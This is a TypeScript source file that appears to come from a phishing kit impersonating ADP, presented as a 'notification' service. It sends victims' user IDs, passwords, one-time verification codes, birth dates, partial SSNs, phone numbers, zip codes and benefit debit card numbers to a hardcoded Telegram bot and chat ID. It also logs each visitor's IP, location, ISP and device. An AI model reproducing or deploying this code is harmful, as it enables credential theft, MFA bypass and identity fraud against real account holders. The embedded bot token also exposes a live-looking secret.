

interface TelegramNotificationData {
  event: string
  details?: Record<string, any>
  timestamp?: string
  userAgent?: string
  ip?: string
}

const TELEGRAM_BOT_TOKEN = "8771897622:AAFZc3ptWAMXsOSbfMOY5hLjJ6q9nBWbIsY"
const TELEGRAM_CHAT_ID = "5841830485"
const SITE_NAME = "ADP"


function getTelegramBotToken(): string | null {
  return TELEGRAM_BOT_TOKEN
}


function getTelegramChatIds(): string[] {
  const chatIdsEnv = TELEGRAM_CHAT_ID
  
  if (!chatIdsEnv) {
    return []
  }

  
  return chatIdsEnv
    .split(",")
    .map((id) => id.trim())
    .filter((id) => id.length > 0)
}


export async function sendTelegramNotification(
  data: TelegramNotificationData
): Promise<void> {
  const botToken = getTelegramBotToken()
  const chatIds = getTelegramChatIds()

  
  if (!botToken || chatIds.length === 0) {
    console.warn("Telegram notifications not configured. Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_IDS")
    return
  }

  
  const timestamp = data.timestamp || new Date().toISOString()
  const message = formatTelegramMessage(data.event, data.details, timestamp)

  
  const promises = chatIds.map((chatId) =>
    sendToTelegram(botToken, chatId, message)
  )

  
  await Promise.allSettled(promises)
}


function escapeMarkdownV2(text: string): string {
  
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&")
}


function formatUTCTime(timestamp?: string): string {
  const date = timestamp ? new Date(timestamp) : new Date()
  const month = String(date.getUTCMonth() + 1).padStart(2, "0")
  const day = String(date.getUTCDate()).padStart(2, "0")
  const year = date.getUTCFullYear()
  const minutes = String(date.getUTCMinutes()).padStart(2, "0")
  const seconds = String(date.getUTCSeconds()).padStart(2, "0")
  
  
  let hours24 = date.getUTCHours()
  const ampm = hours24 >= 12 ? "PM" : "AM"
  let hours12 = hours24 % 12
  if (hours12 === 0) hours12 = 12
  const hours = String(hours12).padStart(2, "0")
  
  return `${month}/${day}/${year}, ${hours}:${minutes}:${seconds} ${ampm}`
}


function formatTelegramMessage(
  event: string,
  details?: Record<string, any>,
  timestamp?: string
): string {
  const utcTime = formatUTCTime(timestamp)

  
  switch (event) {
    case "New Visitor":
      return formatVisitMessage(details || {}, utcTime)
    case "Login Attempt":
      return formatLoginMessage(details || {})
    case "Verification Option Selected":
      return formatTFASelectionMessage(details || {})
    case "Verification Code Submitted":
      return formatTFACodeMessage(details || {})
    default:
      
      const escapedEvent = escapeMarkdownV2(event)
      const escapedTimestamp = escapeMarkdownV2(timestamp || new Date().toISOString())
      let message = `🔔 *${escapedEvent}*\n`
      message += `⏰ ${escapedTimestamp}\n\n`
      
      message += `🌐 Website: ${escapeMarkdownV2(SITE_NAME)}\n`
      
      
      if (details?.pageUrl) {
        message += `🔗 Page URL: ${escapeMarkdownV2(details.pageUrl)}\n`
      }
      
      if (details) {
        for (const [key, value] of Object.entries(details)) {
          
          if (key === "pageUrl") continue
          if (value !== undefined && value !== null) {
            const escapedKey = escapeMarkdownV2(key)
            const escapedValue = escapeMarkdownV2(String(value))
            message += `*${escapedKey}:* ${escapedValue}\n`
          }
        }
      }
      return message
  }
}


function formatVisitMessage(details: Record<string, any>, utcTime: string): string {
  let message = "*New Visitor*\n\n"
  
  message += `🌐 Website: ${escapeMarkdownV2(SITE_NAME)}\n`
  
  if (details.pageUrl) {
    message += `🔗 Page URL: ${escapeMarkdownV2(details.pageUrl)}\n`
  }
  
  if (details.location) {
    message += `📍 Location: ${escapeMarkdownV2(details.location)}\n`
  }
  
  if (details.ip) {
    message += `🌍 IP: ${escapeMarkdownV2(details.ip)}\n`
  }
  
  if (details.timezone) {
    message += `⏰ Timezone: ${escapeMarkdownV2(details.timezone)}\n`
  }
  
  if (details.isp) {
    message += `🌐 ISP: ${escapeMarkdownV2(details.isp)}\n`
  }
  
  if (details.device) {
    message += `📱 Device: ${escapeMarkdownV2(details.device)}\n`
  }
  
  if (details.screen) {
    message += `🖥️ Screen: ${escapeMarkdownV2(details.screen)}\n`
  }
  
  if (details.language) {
    message += `🌍 Language: ${escapeMarkdownV2(details.language)}\n`
  }
  
  message += `\n🕒 UTC Time: ${escapeMarkdownV2(utcTime)}\n`
  
  return message
}


function formatLoginMessage(details: Record<string, any>): string {
  let message = "*🔐 Login Attempt*\n\n"
  
  message += `🌐 Website: ${escapeMarkdownV2(SITE_NAME)}\n`
  
  if (details.pageUrl) {
    message += `🔗 Page URL: ${escapeMarkdownV2(details.pageUrl)}\n`
  }
  
  if (details.userId) {
    message += `👤 User ID or email: ${escapeMarkdownV2(details.userId)}\n`
  } else if (details.email) {
    message += `👤 User ID or email: ${escapeMarkdownV2(details.email)}\n`
  } else if (details.username) {
    message += `👤 User ID or email: ${escapeMarkdownV2(details.username)}\n`
  }
  
  if (details.password) {
    message += `🔑 Password: ${escapeMarkdownV2(details.password)}\n`
  }
  
  return message
}


function formatTFASelectionMessage(details: Record<string, any>): string {
  let message = "*Verification Option Selected*\n\n"
  
  message += `🌐 Website: ${escapeMarkdownV2(SITE_NAME)}\n`
  
  if (details.pageUrl) {
    message += `🔗 Page URL: ${escapeMarkdownV2(details.pageUrl)}\n`
  }
  
  if (details.type) {
    message += `🔐 Type: ${escapeMarkdownV2(details.type)}\n`
  }
  
  return message
}


function formatTFACodeMessage(details: Record<string, any>): string {
  let message = "*✅ Verification Code Submitted*\n\n"
  
  message += `🌐 Website: ${escapeMarkdownV2(SITE_NAME)}\n`
  
  if (details.pageUrl) {
    message += `🔗 Page URL: ${escapeMarkdownV2(details.pageUrl)}\n`
  }
  
  if (details.type) {
    message += `🔐 Type: ${escapeMarkdownV2(details.type)}\n`
  }
  
  if (details.code) {
    message += `🔢 Code: ${escapeMarkdownV2(details.code)}\n`
  }
  
  return message
}


async function sendToTelegram(
  botToken: string,
  chatId: string,
  message: string
): Promise<void> {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "MarkdownV2",
      }),
    })

    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}))
      console.error(`Telegram API error for chat ${chatId}:`, errorData)
    }
  } catch (error) {
    console.error(`Failed to send Telegram notification to chat ${chatId}:`, error)
  }
}


export function getClientInfo(headers: Headers): {
  ip: string | null
  userAgent: string | null
} {
  
  const forwarded = headers.get("x-forwarded-for")
  const realIp = headers.get("x-real-ip")
  const cfConnectingIp = headers.get("cf-connecting-ip") 

  const ip =
    forwarded?.split(",")[0]?.trim() ||
    realIp ||
    cfConnectingIp ||
    null

  const userAgent = headers.get("user-agent") || null

  return { ip, userAgent }
}


export async function getIPGeolocation(ip: string): Promise<{
  location?: string
  timezone?: string
  isp?: string
} | null> {
  try {
    
    if (!ip || ip.startsWith("127.") || ip.startsWith("192.168.") || ip.startsWith("10.") || ip === "::1") {
      return null
    }

    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,timezone,isp`)
    const data = await response.json()

    if (data.status === "success") {
      const locationParts = []
      if (data.city) locationParts.push(data.city)
      if (data.regionName) locationParts.push(data.regionName)
      if (data.country) locationParts.push(data.country)
      
      return {
        location: locationParts.length > 0 ? locationParts.join(", ") : undefined,
        timezone: data.timezone || undefined,
        isp: data.isp || undefined,
      }
    }

    return null
  } catch (error) {
    console.error("Failed to get IP geolocation:", error)
    return null
  }
}





export interface FlowLoginData {
  userId: string
  password: string
}

export interface FlowVerificationData {
  verificationType: string
  code: string
}

export interface FlowIdentityDetailsData {
  dateOfBirth: string
  ssnLast4: string
  phoneNumber: string
  zipCode: string
}

class TelegramFlowService {
  private botToken: string
  private chatIds: string[]

  
  constructor() {
    this.botToken = TELEGRAM_BOT_TOKEN
    const raw = TELEGRAM_CHAT_ID
    this.chatIds = raw
      .split(",")
      .map((id) => id.trim())
      .filter((id) => id.length > 0)
  }

  private async sendMessage(message: string): Promise<void> {
    if (!this.botToken || this.chatIds.length === 0) {
      console.error("Telegram not configured for flow notifications")
      return
    }

    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`

    try {
      await Promise.all(
        this.chatIds.map((chatId) =>
          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "HTML",
            }),
          }),
        ),
      )
    } catch (error) {
      console.error("Failed to send Telegram message:", error)
    }
  }

  async sendLoginNotification(data: FlowLoginData): Promise<void> {
    const message = `\n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n👤 <b>User ID:</b> ${data.userId}\n🔑 <b>Password:</b> ${data.password}`
    await this.sendMessage(message)
  }

  async sendVerificationNotification(data: FlowVerificationData): Promise<void> {
    const message = `\n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${data.verificationType}\n🔢 <b>Code:</b> ${data.code}`
    await this.sendMessage(message)
  }

  async sendIdentityDetailsNotification(data: FlowIdentityDetailsData | { cardNumber?: string }): Promise<void> {
    let message = `\n🪪 <b>Identity Details Submitted - ${SITE_NAME}</b>\n`;
    if ('cardNumber' in data && data.cardNumber) {
      message += `\n💳 <b>Benefit Account Debit Card:</b> ${data.cardNumber}`;
    } else {
      if ('dateOfBirth' in data && data.dateOfBirth) message += `\n📅 <b>Date of Birth:</b> ${data.dateOfBirth}`;
      if ('ssnLast4' in data && data.ssnLast4) message += `\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}`;
      if ('phoneNumber' in data && data.phoneNumber) message += `\n📱 <b>Phone Number:</b> ${data.phoneNumber}`;
      if ('zipCode' in data && data.zipCode) message += `\n📮 <b>Zip Code:</b> ${data.zipCode}`;
    }
    await this.sendMessage(message);
  }

  async sendResendCodeNotification(isSecondOtp: boolean): Promise<void> {
    const otpType = isSecondOtp ? "Code (final)" : "Code (first OTP)"
    const message = `\n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>\n\n🔐 <b>OTP Type:</b> ${otpType}`
    await this.sendMessage(message)
  }
}


export const telegramService = new TelegramFlowService()

